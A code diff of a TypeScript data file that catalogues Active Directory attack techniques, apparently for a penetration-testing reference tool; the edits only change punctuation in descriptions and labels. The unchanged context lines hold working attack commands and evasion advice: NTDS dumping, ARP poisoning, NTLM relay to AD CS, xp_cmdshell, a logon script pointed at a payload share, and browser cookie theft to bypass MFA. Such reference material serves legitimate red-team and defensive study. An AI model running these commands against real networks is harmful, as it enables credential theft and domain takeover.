@@ -18,7 +18,7 @@ export const adCoverageNodes: TechniqueNodeDef[] = [
     phase: 'credential-access',
     summary: "Copy the DC's locked AD database via Shadow Copy / ntdsutil IFM, parse offline.",
     description:
-      "With admin access to a Domain Controller, the locked NTDS.dit database can be copied by snapshotting the volume (vssadmin/diskshadow) or via ntdsutil's IFM export. With the SYSTEM hive it yields NT hashes, Kerberos keys (incl. krbtgt) and password history for every account — the on-DC alternative to DCSync, and how a stolen DC backup/VM is looted.",
+      "With admin access to a Domain Controller, the locked NTDS.dit database can be copied by snapshotting the volume (vssadmin/diskshadow) or via ntdsutil's IFM export. With the SYSTEM hive it yields NT hashes, Kerberos keys (incl. krbtgt) and password history for every account: the on-DC alternative to DCSync, and how a stolen DC backup/VM is looted.",
     tools: [
       { name: 'secretsdump (Impacket)', url: 'https://github.com/fortra/impacket' },
       { name: 'ntdsutil', url: 'https://ss64.com/nt/ntdsutil.html' },
@@ -31,7 +31,7 @@ export const adCoverageNodes: TechniqueNodeDef[] = [
     ],
     mitre: mitre('T1003.003'),
     references: [
-      { label: 'HackTricks — DCSync (NTDS secrets)', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/dcsync.html' },{ label: 'The Hacker Recipes — NTDS secrets', url: 'https://www.thehacker.recipes/ad/movement/credentials/dumping/ntds' }],
+      { label: 'HackTricks, DCSync (NTDS secrets)', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/dcsync.html' },{ label: 'The Hacker Recipes, NTDS secrets', url: 'https://www.thehacker.recipes/ad/movement/credentials/dumping/ntds' }],
     requires: ['Administrative access to a Domain Controller (or a stolen DC backup/VM)'],
     opsec: 'Shadow-copy creation and ntdsutil snapshots are logged (4688 / VSS events) and noisy; defenders monitor secretsdump/ntdsutil patterns. Pull only the needed hives and clean up snapshots.',
     difficulty: 'easy',
@@ -55,7 +55,7 @@ export const adCoverageNodes: TechniqueNodeDef[] = [
     ],
     mitre: mitre('T1555.004'),
     references: [
-      { label: 'HackTricks — DPAPI: Extracting Passwords', url: 'https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords.html' },{ label: 'The Hacker Recipes — DPAPI secrets', url: 'https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets' }],
+      { label: 'HackTricks, DPAPI: Extracting Passwords', url: 'https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords.html' },{ label: 'The Hacker Recipes, DPAPI secrets', url: 'https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi-protected-secrets' }],
     requires: ["SYSTEM on the user's host, or the user's password/hash, or the domain DPAPI backup key"],
     opsec: "Reading other users' masterkey/credential files and touching LSASS for the master-key cache can trigger EDR; remote DonPAPI collection generates SMB access to profile paths across many hosts.",
     difficulty: 'medium',
@@ -65,7 +65,7 @@ export const adCoverageNodes: TechniqueNodeDef[] = [
     label: 'WDigest Cleartext Downgrade',
     phase: 'credential-access',
     summary: 'Re-enable WDigest plaintext caching, then read passwords from LSASS after a logon.',
-    description: r`Since Windows 8.1 / Server 2012 R2, WDigest no longer caches plaintext credentials in LSASS by default. An admin can set HKLM\...\WDigest\UseLogonCredential to 1 to force cleartext caching again, then wait for interactive/RDP logons and dump LSASS to read passwords directly — avoiding offline cracking. A patient-attacker technique, best on jump hosts with frequent privileged logons.`,
+    description: r`Since Windows 8.1 / Server 2012 R2, WDigest no longer caches plaintext credentials in LSASS by default. An admin can set HKLM\...\WDigest\UseLogonCredential to 1 to force cleartext caching again, then wait for interactive/RDP logons and dump LSASS to read passwords directly, avoiding offline cracking. A patient-attacker technique, best on jump hosts with frequent privileged logons.`,
     tools: [
       { name: 'mimikatz (sekurlsa::wdigest)', url: 'https://github.com/gentilkiwi/mimikatz' },
     ],
@@ -75,7 +75,7 @@ export const adCoverageNodes: TechniqueNodeDef[] = [
     ],
     mitre: mitre('T1112'),
     references: [
-      { label: 'HackTricks — Stealing Credentials', url: 'https://book.hacktricks.wiki/en/windows-hardening/stealing-credentials/index.html' },{ label: 'The Hacker Recipes — In-memory secrets', url: 'https://www.thehacker.recipes/ad/movement/credentials/dumping/in-memory' }],
+      { label: 'HackTricks, Stealing Credentials', url: 'https://book.hacktricks.wiki/en/windows-hardening/stealing-credentials/index.html' },{ label: 'The Hacker Recipes, In-memory secrets', url: 'https://www.thehacker.recipes/ad/movement/credentials/dumping/in-memory' }],
     requires: ['Local admin / SYSTEM on the host', 'A victim interactive/RDP logon after the change'],
     opsec: 'Writing UseLogonCredential=1 is a high-signal indicator monitored by EDR and Sysmon registry rules; it also requires waiting for a victim logon, increasing dwell time.',
     difficulty: 'easy',
@@ -84,7 +84,7 @@ export const adCoverageNodes: TechniqueNodeDef[] = [
     id: 'timeroast',
     label: 'Timeroast',
     phase: 'credential-access',
-    summary: 'Abuse MS-SNTP to extract crackable computer/trust account hashes from a DC — no auth.',
+    summary: 'Abuse MS-SNTP to extract crackable computer/trust account hashes from a DC, no auth needed.',
     description:
       "Domain Controllers authenticate NTP responses (MS-SNTP) with a MAC keyed on the queried account's NT hash, indexed by RID. An unauthenticated attacker iterates RIDs against the DC's UDP/123 service to obtain password-equivalent hashes for all computer/trust accounts, then cracks them offline (hashcat -m 31300). Effective against weak/predictable machine passwords.",
     tools: [
@@ -99,13 +99,13 @@ export const adCoverageNodes: TechniqueNodeDef[] = [
     mitre: mitre('T1110.002'),
     references: [
       {
-        label: 'Secura whitepaper — Timeroasting, Trustroasting & Computer Spraying (Tom Tervoort, original research)',
+        label: 'Secura whitepaper, Timeroasting, Trustroasting & Computer Spraying (Tom Tervoort, original research)',
         url: 'https://cybersecurity.bureauveritas.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf',
       },
-      { label: 'The Hacker Recipes — Timeroast', url: 'https://www.thehacker.recipes/ad/movement/kerberos/timeroast' },
+      { label: 'The Hacker Recipes, Timeroast', url: 'https://www.thehacker.recipes/ad/movement/kerberos/timeroast' },
     ],
     requires: ['Network access to a Domain Controller (UDP/123); no credentials needed'],
-    opsec: 'Very stealthy — NTP traffic to a DC is ubiquitous and rarely audited. The loud part is offline cracking, which is invisible to the target.',
+    opsec: 'Very stealthy: NTP traffic to a DC is ubiquitous and rarely audited. The loud part is offline cracking, which is invisible to the target.',
     difficulty: 'medium',
   },
   {
@@ -114,7 +114,7 @@ export const adCoverageNodes: TechniqueNodeDef[] = [
     phase: 'credential-access',
     summary: "Recover an account's NT hash from a PKINIT (certificate) TGT via a U2U request.",
     description:
-      "When PKINIT yields a TGT (from an AD CS cert or Shadow Credentials), the KDC embeds the account's NT hash in the PAC's PAC_CREDENTIAL_INFO so NTLM still works. A U2U S4U2self request with that TGT decrypts the buffer and recovers the NT hash — bridging certificate access to hash attacks (PtH, silver tickets) without the password.",
+      "When PKINIT yields a TGT (from an AD CS cert or Shadow Credentials), the KDC embeds the account's NT hash in the PAC's PAC_CREDENTIAL_INFO so NTLM still works. A U2U S4U2self request with that TGT decrypts the buffer and recovers the NT hash, bridging certificate access to hash attacks (PtH, silver tickets) without the password.",
     tools: [
       { name: 'Certipy (auth)', url: 'https://github.com/ly4k/Certipy' },
       { name: 'PKINITtools', url: 'https://github.com/dirkjanm/PKINITtools' },
@@ -127,7 +127,7 @@ getnthash.py corp.local/user -key <AS-REP-key>`, lang: 'bash' },
     ],
     mitre: mitre('T1558'),
     references: [
-      { label: 'HackTricks — AD CS Account Persistence', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/account-persistence.html' },{ label: 'The Hacker Recipes — UnPAC the hash', url: 'https://www.thehacker.recipes/ad/movement/kerberos/unpac-the-hash' }],
+      { label: 'HackTricks, AD CS Account Persistence', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/account-persistence.html' },{ label: 'The Hacker Recipes, UnPAC the hash', url: 'https://www.thehacker.recipes/ad/movement/kerberos/unpac-the-hash' }],
     requires: ['A PKINIT-capable certificate or key credential for the target (from AD CS / Shadow Credentials)'],
     opsec: 'Uses normal PKINIT/Kerberos flows so it blends in; the upstream certificate enrollment is the more detectable step.',
     difficulty: 'medium',
@@ -138,7 +138,7 @@ getnthash.py corp.local/user -key <AS-REP-key>`, lang: 'bash' },
     phase: 'lateral-movement',
     summary: 'Forge the forwardable flag on S4U2self tickets to bypass delegation restrictions.',
     description:
-      "CVE-2020-17049 lets an attacker who controls a delegation-configured account tamper with the encrypted S4U2self ticket to set the forwardable bit — even without TrustedToAuthForDelegation, or when the target is 'sensitive and cannot be delegated' / in Protected Users. This widens constrained-delegation abuse to impersonate otherwise-protected privileged users.",
+      "CVE-2020-17049 lets an attacker who controls a delegation-configured account tamper with the encrypted S4U2self ticket to set the forwardable bit, even without TrustedToAuthForDelegation, or when the target is 'sensitive and cannot be delegated' / in Protected Users. This widens constrained-delegation abuse to impersonate otherwise-protected privileged users.",
     tools: [{ name: 'getST (Impacket)', url: 'https://github.com/fortra/impacket' }],
     commands: [
       { label: 'Forge a forwardable S4U ticket', code: r`getST.py -spn cifs/target.corp.local -impersonate Administrator -force-forwardable corp.local/svc$ -hashes :<NT-hash>`, lang: 'bash' },
@@ -146,10 +146,10 @@ getnthash.py corp.local/user -key <AS-REP-key>`, lang: 'bash' },
     mitre: mitre('T1558'),
     references: [
       {
-        label: 'NetSPI — Kerberos Bronze Bit Attack, CVE-2020-17049 (Jake Karnes, original research)',
+        label: 'NetSPI, Kerberos Bronze Bit Attack, CVE-2020-17049 (Jake Karnes, original research)',
         url: 'https://www.netspi.com/blog/technical-blog/network-pentesting/cve-2020-17049-kerberos-bronze-bit-overview/',
       },
-      { label: 'The Hacker Recipes — Bronze Bit', url: 'https://www.thehacker.recipes/ad/movement/kerberos/delegations/bronze-bit' },
+      { label: 'The Hacker Recipes, Bronze Bit', url: 'https://www.thehacker.recipes/ad/movement/kerberos/delegations/bronze-bit' },
     ],
     requires: ["Control of a delegation-configured account's key/hash", 'An unpatched KDC (pre Nov-2020)'],
     opsec: 'Requires the delegation account key; ticket forging is offline. Patched on updated DCs, so success implies an unpatched KDC.',
@@ -170,7 +170,7 @@ getnthash.py corp.local/user -key <AS-REP-key>`, lang: 'bash' },
       { label: 'Targeted ARP MITM (bettercap)', code: r`bettercap -iface eth0 -eval "set arp.spoof.targets 10.0.0.50; arp.spoof on; net.sniff on"`, lang: 'bash' },
     ],
     mitre: mitre('T1557.002'),
-    references: [{ label: 'The Hacker Recipes — ARP poisoning', url: 'https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/arp-poisoning' }],
+    references: [{ label: 'The Hacker Recipes, ARP poisoning', url: 'https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/arp-poisoning' }],
     requires: ['Layer-2 access to the target segment'],
     opsec: 'Loud and risky: floods the segment, can break connectivity, and is flagged by NIDS / dynamic ARP inspection. Poison specific hosts, never the whole subnet, and enable IP forwarding.',
     difficulty: 'medium',
@@ -181,7 +181,7 @@ getnthash.py corp.local/user -key <AS-REP-key>`, lang: 'bash' },
     phase: 'initial-access',
     summary: 'As any user, add a DNS record (or wildcard) to MITM name resolution domain-wide.',
     description:
-      "AD-Integrated DNS zones grant Authenticated Users the right to create child records by default. An attacker adds records pointing at themselves — or a wildcard '*' that answers all unresolved names — turning one LDAP write into domain-wide LLMNR-style poisoning that survives reboots. Often chained with WPAD to coerce auth for relay.",
+      "AD-Integrated DNS zones grant Authenticated Users the right to create child records by default. An attacker adds records pointing at themselves (or a wildcard '*' that answers all unresolved names), turning one LDAP write into domain-wide LLMNR-style poisoning that survives reboots. Often chained with WPAD to coerce auth for relay.",
     tools: [
       { name: 'bloodyAD', url: 'https://github.com/CravateRouge/bloodyAD' },
       { name: 'krbrelayx (dnstool.py)', url: 'https://github.com/dirkjanm/krbrelayx' },
@@ -194,7 +194,7 @@ getnthash.py corp.local/user -key <AS-REP-key>`, lang: 'bash' },
     ],
     mitre: mitre('T1557'),
     references: [
-      { label: 'HackTricks — AD DNS Records', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-dns-records.html' },{ label: 'The Hacker Recipes — ADIDNS spoofing', url: 'https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/adidns-spoofing' }],
+      { label: 'HackTricks, AD DNS Records', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-dns-records.html' },{ label: 'The Hacker Recipes, ADIDNS spoofing', url: 'https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/adidns-spoofing' }],
     requires: ['Any authenticated domain account', 'AD-integrated DNS zone with default create-child rights'],
     opsec: 'Writes a persistent object visible in DNS Manager and LDAP; a domain-wide wildcard is disruptive and conspicuous. Clean up records and prefer targeted entries.',
     difficulty: 'medium',
@@ -205,7 +205,7 @@ getnthash.py corp.local/user -key <AS-REP-key>`, lang: 'bash' },
     phase: 'credential-access',
     summary: 'Coerce a WebClient host over HTTP → relay cross-protocol to LDAP / AD CS (ESC8).',
     description:
-      'If the WebClient (WebDAV) service runs on a target (or is started remotely via a planted .searchConnector-ms), coercion methods like PetitPotam/PrinterBug can be pointed at an attacker WebDAV listener using the SERVER@PORT/path syntax. The resulting auth travels over HTTP — not protected by SMB signing — so it relays cross-protocol to LDAP (RBCD/shadow creds) or AD CS web enrollment (ESC8).',
+      'If the WebClient (WebDAV) service runs on a target (or is started remotely via a planted .searchConnector-ms), coercion methods like PetitPotam/PrinterBug can be pointed at an attacker WebDAV listener using the SERVER@PORT/path syntax. The resulting auth travels over HTTP (not protected by SMB signing), so it relays cross-protocol to LDAP (RBCD/shadow creds) or AD CS web enrollment (ESC8).',
     tools: [
       { name: 'WebclientServiceScanner', url: 'https://github.com/Hackndo/WebclientServiceScanner' },
       { name: 'PetitPotam', url: 'https://github.com/topotam/PetitPotam' },
@@ -217,7 +217,7 @@ getnthash.py corp.local/user -key <AS-REP-key>`, lang: 'bash' },
       { label: 'Relay to AD CS web enrollment (ESC8)', code: r`ntlmrelayx.py -t http://ca.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template Machine`, lang: 'bash' },
     ],
     mitre: mitre('T1187'),
-    references: [{ label: 'The Hacker Recipes — WebClient (WebDAV)', url: 'https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/webclient' }],
+    references: [{ label: 'The Hacker Recipes, WebClient (WebDAV)', url: 'https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/webclient' }],
     requires: ['The WebClient service running on the target', 'A coercion vector (PetitPotam/PrinterBug)'],
     opsec: 'WebClient is default-off on servers but often on workstations. Starting it remotely and the coercion RPC calls are detectable; ESC8/relay chains are high-impact and monitored.',
     difficulty: 'medium',
@@ -228,7 +228,7 @@ getnthash.py corp.local/user -key <AS-REP-key>`, lang: 'bash' },
     phase: 'lateral-movement',
     summary: 'Default MAQ=10 lets any user create the computer account RBCD / Shadow Creds / noPac need.',
     description:
-      'By default any authenticated user can join up to 10 computers (ms-DS-MachineAccountQuota = 10). An attacker creates a fully-controlled machine account to use as the attacker-owned principal required by several primitives — the delegate in RBCD, the principal in Shadow Credentials, and the account in the noPac / sAMAccountName-spoofing chain.',
+      'By default any authenticated user can join up to 10 computers (ms-DS-MachineAccountQuota = 10). An attacker creates a fully-controlled machine account to use as the attacker-owned principal required by several primitives: the delegate in RBCD, the principal in Shadow Credentials, and the account in the noPac / sAMAccountName-spoofing chain.',
     tools: [
       { name: 'bloodyAD', url: 'https://github.com/CravateRouge/bloodyAD' },
       { name: 'addcomputer (Impacket)', url: 'https://github.com/fortra/impacket' },
@@ -240,7 +240,7 @@ getnthash.py corp.local/user -key <AS-REP-key>`, lang: 'bash' },
       { label: 'Create a computer account', code: r`addcomputer.py -computer-name 'EVIL$' -computer-pass 'Pwn1234!' -dc-host dc01.corp.local corp.local/user:'Password1'`, lang: 'bash' },
     ],
     mitre: mitre('T1136.002'),
-    references: [{ label: 'The Hacker Recipes — MachineAccountQuota', url: 'https://www.thehacker.recipes/ad/movement/builtins/machineaccountquota' }],
+    references: [{ label: 'The Hacker Recipes, MachineAccountQuota', url: 'https://www.thehacker.recipes/ad/movement/builtins/machineaccountquota' }],
     requires: ['Any authenticated domain account', 'ms-DS-MachineAccountQuota > 0 (default 10)'],
     opsec: 'Computer-account creation raises event 4741 and leaves a new object in AD; some environments set MAQ=0. The follow-on RBCD/shadow-cred LDAP writes are the higher-signal actions.',
     difficulty: 'easy',
@@ -251,7 +251,7 @@ getnthash.py corp.local/user -key <AS-REP-key>`, lang: 'bash' },
     phase: 'priv-esc',
     summary: 'Write scriptPath / msTSInitialProgram on a user → code exec as them at next logon.',
     description:
-      "GenericAll/GenericWrite over a user lets an attacker populate scriptPath (classic logon script) or msTSInitialProgram with a UNC path to a payload. At the victim's next logon it executes in their context — useful against high-value accounts when an interactive trigger is realistic.",
+      "GenericAll/GenericWrite over a user lets an attacker populate scriptPath (classic logon script) or msTSInitialProgram with a UNC path to a payload. At the victim's next logon it executes in their context: useful against high-value accounts when an interactive trigger is realistic.",
     tools: [
       { name: 'bloodyAD', url: 'https://github.com/CravateRouge/bloodyAD' },
       { name: 'PowerView', url: 'https://github.com/PowerShellMafia/PowerSploit' },
@@ -260,7 +260,7 @@ getnthash.py corp.local/user -key <AS-REP-key>`, lang: 'bash' },
       { label: 'Set scriptPath via bloodyAD', code: r`bloodyAD --host dc01.corp.local -d corp.local -u user -p 'Password1' set object victimuser scriptPath -v '\\10.0.0.66\share\run.exe'`, lang: 'bash' },
     ],
     mitre: mitre('T1037.003'),
-    references: [{ label: 'The Hacker Recipes — Logon script', url: 'https://www.thehacker.recipes/ad/movement/dacl/logon-script' }],
+    references: [{ label: 'The Hacker Recipes, Logon script', url: 'https://www.thehacker.recipes/ad/movement/dacl/logon-script' }],
     requires: ['GenericAll/GenericWrite over the target user', 'The victim logs on after the change'],
     opsec: 'Relies on the victim actually logging on (slow/uncertain) and the payload share being reachable; modifying scriptPath is visible in AD. Lower-noise ACL paths (targeted Kerberoast, shadow creds) are usually preferred.',
     difficulty: 'medium',
@@ -271,7 +271,7 @@ getnthash.py corp.local/user -key <AS-REP-key>`, lang: 'bash' },
     phase: 'persistence',
     summary: 'Steal the KDS root key to compute any gMSA password offline, forever.',
     description:
-      "gMSA passwords are derived deterministically from the (rarely-rotated) KDS root key plus the account SID and a password ID. With forest-root DA / SYSTEM on a DC, read the KDS root key once, then compute the current managed password of any gMSA offline at any time — even after resets — and derive its NT hash for pass-the-hash. Persistence lasts until the KDS root key changes.",
+      "gMSA passwords are derived deterministically from the (rarely-rotated) KDS root key plus the account SID and a password ID. With forest-root DA / SYSTEM on a DC, read the KDS root key once, then compute the current managed password of any gMSA offline at any time (even after resets) and derive its NT hash for pass-the-hash. Persistence lasts until the KDS root key changes.",
     tools: [
       { name: 'GoldenGMSA', url: 'https://github.com/Semperis/GoldenGMSA' },
       { name: 'gMSADumper', url: 'https://github.com/micahvandeusen/gMSADumper' },
@@ -283,10 +283,10 @@ getnthash.py corp.local/user -key <AS-REP-key>`, lang: 'bash' },
     mitre: mitre('T1558'),
     references: [
       {
-        label: 'Semperis — Introducing the Golden GMSA Attack (Yuval Gordon, original research)',
+        label: 'Semperis, Introducing the Golden GMSA Attack (Yuval Gordon, original research)',
         url: 'https://www.semperis.com/blog/golden-gmsa-attack/',
       },
-      { label: 'The Hacker Recipes — GoldenGMSA', url: 'https://www.thehacker.recipes/ad/persistence/goldengmsa' },
+      { label: 'The Hacker Recipes, GoldenGMSA', url: 'https://www.thehacker.recipes/ad/persistence/goldengmsa' },
     ],
     requires: ['Forest-root Domain Admin / SYSTEM on a DC to read the KDS root key (once)'],
     opsec: 'Reading the KDS root key needs high privilege once; afterwards all password computation is offline and undetectable. Rotating the KDS root key (rare/operationally hard) is the only real remediation.',
@@ -308,8 +308,8 @@ getnthash.py corp.local/user -key <AS-REP-key>`, lang: 'bash' },
     ],
     mitre: mitre('T1190'),
     references: [
-      { label: 'proxylogon.com — DEVCORE (Orange Tsai), original disclosure', url: 'https://proxylogon.com/' },
-      { label: 'The Hacker Recipes — ProxyLogon', url: 'https://www.thehacker.recipes/ad/movement/exchange-services/proxylogon' },
+      { label: 'proxylogon.com, DEVCORE (Orange Tsai), original disclosure', url: 'https://proxylogon.com/' },
+      { label: 'The Hacker Recipes, ProxyLogon', url: 'https://www.thehacker.recipes/ad/movement/exchange-services/proxylogon' },
     ],
     requires: ['Network access to an unpatched on-prem Exchange (pre Mar-2021)'],
     opsec: 'Webshell drops to known OWA/ECP paths are heavily signatured and widely IOC\'d. Only viable against unpatched/internet-exposed Exchange.',
@@ -333,7 +333,7 @@ set PASSWORD Password1
 run`, lang: 'bash' },
     ],
     mitre: mitre('T1190'),
-    references: [{ label: 'Unit 42 — ProxyNotShell', url: 'https://unit42.paloaltonetworks.com/proxynotshell-cve-2022-41040-cve-2022-41082/' }],
+    references: [{ label: 'Unit 42, ProxyNotShell', url: 'https://unit42.paloaltonetworks.com/proxynotshell-cve-2022-41040-cve-2022-41082/' }],
     requires: ['A standard mailbox account', 'Unpatched Exchange (pre Nov-2022)'],
     opsec: 'Requires authentication; URL-rewrite mitigations were widely deployed and the chain is heavily detected. Patched Nov 2022.',
     difficulty: 'medium',
@@ -343,7 +343,7 @@ run`, lang: 'bash' },
     label: 'Local Credential Hunting',
     phase: 'credential-access',
     summary:
-      "Sweep a host's files, registry and history for plaintext secrets — PS history, autologon, Credential Manager, unattend, WiFi, sticky notes.",
+      "Sweep a host's files, registry and history for plaintext secrets: PS history, autologon, Credential Manager, unattend, WiFi, sticky notes.",
     description:
       "Once you can read a host, an operator sweep turns up cleartext or trivially-recoverable secrets the protected stores miss: PowerShell history (ConsoleHost_history.txt), Windows Credential Manager / Vault (cmdkey, vaultcmd), Winlogon autologon (DefaultPassword), unattend.xml / sysprep, IIS web.config & app-pool identities, scheduled-task XML, WiFi PSKs, Sticky Notes and the Notepad tab cache. Triage tools automate the whole hunt.",
     tools: [
@@ -384,12 +384,12 @@ nxc smb <host> -u <u> -p <p> -M powershell_history -M gpp_autologin`,
     ],
     mitre: mitre('T1555'),
     references: [
-      { label: 'GhostPack — Seatbelt', url: 'https://github.com/GhostPack/Seatbelt' },
+      { label: 'GhostPack, Seatbelt', url: 'https://github.com/GhostPack/Seatbelt' },
       { label: 'LaZagne', url: 'https://github.com/AlessandroZ/LaZagne' },
     ],
     requires: ['Read access to a host (local user; local admin for protected paths)'],
     opsec:
-      'Mostly read-only file/registry access — quiet. The loud part is running a known triage binary (Seatbelt/LaZagne), which is heavily AV-signatured; prefer manual/targeted reads on monitored hosts.',
+      'Mostly read-only file/registry access, so it stays quiet. The loud part is running a known triage binary (Seatbelt/LaZagne), which is heavily AV-signatured; prefer manual/targeted reads on monitored hosts.',
     difficulty: 'easy',
   },
   {
@@ -397,9 +397,9 @@ nxc smb <host> -u <u> -p <p> -M powershell_history -M gpp_autologin`,
     label: 'Browser Credentials & Cookies',
     phase: 'credential-access',
     summary:
-      'Decrypt saved browser logins and steal session cookies (incl. Chrome App-Bound Encryption) — replay cookies to bypass MFA.',
+      'Decrypt saved browser logins and steal session cookies (incl. Chrome App-Bound Encryption); replay cookies to bypass MFA.',
     description:
-      'Chromium/Edge store logins and cookies under DPAPI (and, on Chrome v127+, App-Bound Encryption); Firefox uses its own NSS key store. Beyond passwords, stealing live session cookies/tokens lets you replay an already-authenticated session — bypassing MFA — into M365, SSO and cloud apps.',
+      'Chromium/Edge store logins and cookies under DPAPI (and, on Chrome v127+, App-Bound Encryption); Firefox uses its own NSS key store. Beyond passwords, stealing live session cookies/tokens lets you replay an already-authenticated session (bypassing MFA) into M365, SSO and cloud apps.',
     tools: [
       { name: 'SharpChrome', url: 'https://github.com/GhostPack/SharpDPAPI' },
       { name: 'SharpDPAPI', url: 'https://github.com/GhostPack/SharpDPAPI' },
@@ -416,9 +416,9 @@ SharpChrome.exe cookies /unprotect /format:json`,
     ],
     mitre: mitre('T1555.003'),
     references: [
-      { label: 'GhostPack — SharpDPAPI / SharpChrome', url: 'https://github.com/GhostPack/SharpDPAPI' },
+      { label: 'GhostPack, SharpDPAPI / SharpChrome', url: 'https://github.com/GhostPack/SharpDPAPI' },
       {
-        label: 'HackTricks — DPAPI: Extracting Passwords',
+        label: 'HackTricks, DPAPI: Extracting Passwords',
         url: 'https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords.html',
       },
     ],
@@ -452,14 +452,14 @@ bloodyAD -u <u> -p <p> -d <domain> --host <dc> remove uac <victim> -f DONT_REQ_P
     mitre: mitre('T1558.004'),
     references: [
       {
-        label: 'HackTricks — ASREPRoast',
+        label: 'HackTricks, ASREPRoast',
         url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/asreproast.html',
       },
-      { label: 'bloodyAD — User Guide', url: 'https://github.com/CravateRouge/bloodyAD/wiki/User-Guide' },
+      { label: 'bloodyAD, User Guide', url: 'https://github.com/CravateRouge/bloodyAD/wiki/User-Guide' },
     ],
     requires: ['GenericAll / GenericWrite (userAccountControl) over the target user'],
     opsec:
-      'Toggling UAC (event 4738) and a pre-auth-disabled AS-REQ are detectable — revert the flag promptly. Cracking is offline and invisible.',
+      'Toggling UAC (event 4738) and a pre-auth-disabled AS-REQ are detectable; revert the flag promptly. Cracking is offline and invisible.',
     difficulty: 'medium',
   },
   {
@@ -468,7 +468,7 @@ bloodyAD -u <u> -p <p> -d <domain> --host <dc> remove uac <victim> -f DONT_REQ_P
     phase: 'lateral-movement',
     summary: 'Log in to MSSQL and get host RCE as the SQL service account via xp_cmdshell (or OLE / Agent).',
     description:
-      'A SQL login with sysadmin (or an impersonation path to it) can enable and run xp_cmdshell, executing OS commands as the SQL Server service account — frequently a local admin/SYSTEM foothold and a pivot point. OLE automation and the SQL Agent are quieter alternatives to xp_cmdshell.',
+      'A SQL login with sysadmin (or an impersonation path to it) can enable and run xp_cmdshell, executing OS commands as the SQL Server service account, frequently a local admin/SYSTEM foothold and a pivot point. OLE automation and the SQL Agent are quieter alternatives to xp_cmdshell.',
     tools: [
       { name: 'NetExec (mssql)', url: 'https://github.com/Pennyw0rth/NetExec' },
       { name: 'Impacket (mssqlclient)', url: 'https://github.com/fortra/impacket' },
@@ -488,7 +488,7 @@ SQL> xp_cmdshell whoami`,
     references: [
       { label: 'PowerUpSQL', url: 'https://github.com/NetSPI/PowerUpSQL' },
       {
-        label: 'HackTricks — Pentesting MSSQL',
+        label: 'HackTricks, Pentesting MSSQL',
         url: 'https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html',
       },
     ],
@@ -501,9 +501,9 @@ SQL> xp_cmdshell whoami`,
     id: 'tgt-harvest',
     label: 'TGT / Ticket Harvesting',
     phase: 'credential-access',
-    summary: 'On a host you control, continuously export TGTs/TGSs from LSASS as users log on — a stream of reusable tickets.',
+    summary: 'On a host you control, continuously export TGTs/TGSs from LSASS as users log on: a stream of reusable tickets.',
     description:
-      "Rather than a one-shot LSASS dump, passively monitor a controlled host and export each new logon's Kerberos tickets as they arrive. Every interactive/network logon — admins running tools, scheduled tasks, service connections — yields a fresh TGT to pass-the-ticket as that user.",
+      "Rather than a one-shot LSASS dump, passively monitor a controlled host and export each new logon's Kerberos tickets as they arrive. Every interactive/network logon (admins running tools, scheduled tasks, service connections) yields a fresh TGT to pass-the-ticket as that user.",
     tools: [
       { name: 'Rubeus', url: 'https://github.com/GhostPack/Rubeus' },
       { name: 'mimikatz', url: 'https://github.com/gentilkiwi/mimikatz' },
@@ -519,9 +519,9 @@ Rubeus.exe harvest /interval:30`,
     ],
     mitre: mitre('T1558'),
     references: [
-      { label: 'GhostPack — Rubeus', url: 'https://github.com/GhostPack/Rubeus' },
+      { label: 'GhostPack, Rubeus', url: 'https://github.com/GhostPack/Rubeus' },
       {
-        label: 'HackTricks — Pass the Ticket',
+        label: 'HackTricks, Pass the Ticket',
         url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/pass-the-ticket.html',
       },
     ],
@@ -536,7 +536,7 @@ Rubeus.exe harvest /interval:30`,
     phase: 'credential-access',
     summary: 'Force NetNTLMv1, capture it with a chosen challenge, and crack it to the NT hash in minutes via DES / crack.sh.',
     description:
-      "Where LmCompatibilityLevel still allows NTLMv1, capture or coerce a machine/user NetNTLMv1 response using the fixed challenge 1122334455667788 and crack it to the raw NT hash in minutes (DES is broken; crack.sh is free). Recovering a DC or computer account's NT hash this way bridges straight to silver tickets, RBCD or DCSync — no password needed.",
+      "Where LmCompatibilityLevel still allows NTLMv1, capture or coerce a machine/user NetNTLMv1 response using the fixed challenge 1122334455667788 and crack it to the raw NT hash in minutes (DES is broken; crack.sh is free). Recovering a DC or computer account's NT hash this way bridges straight to silver tickets, RBCD or DCSync, with no password needed.",
     tools: [
       { name: 'Responder', url: 'https://github.com/lgandx/Responder' },
       { name: 'NetExec (ntlmv1)', url: 'https://github.com/Pennyw0rth/NetExec' },
@@ -555,8 +555,8 @@ hashcat -m 5500 netntlmv1.txt`,
     ],
     mitre: mitre('T1110.002'),
     references: [
-      { label: 'crack.sh — NetNTLMv1 cracking', url: 'https://crack.sh/' },
-      { label: 'HackTricks — NTLM', url: 'https://book.hacktricks.wiki/en/windows-hardening/ntlm/index.html' },
+      { label: 'crack.sh, NetNTLMv1 cracking', url: 'https://crack.sh/' },
+      { label: 'HackTricks, NTLM', url: 'https://book.hacktricks.wiki/en/windows-hardening/ntlm/index.html' },
     ],
     requires: ['A target allowing NTLMv1 (LmCompatibilityLevel <= 2) + ability to capture/coerce its auth'],
     opsec:
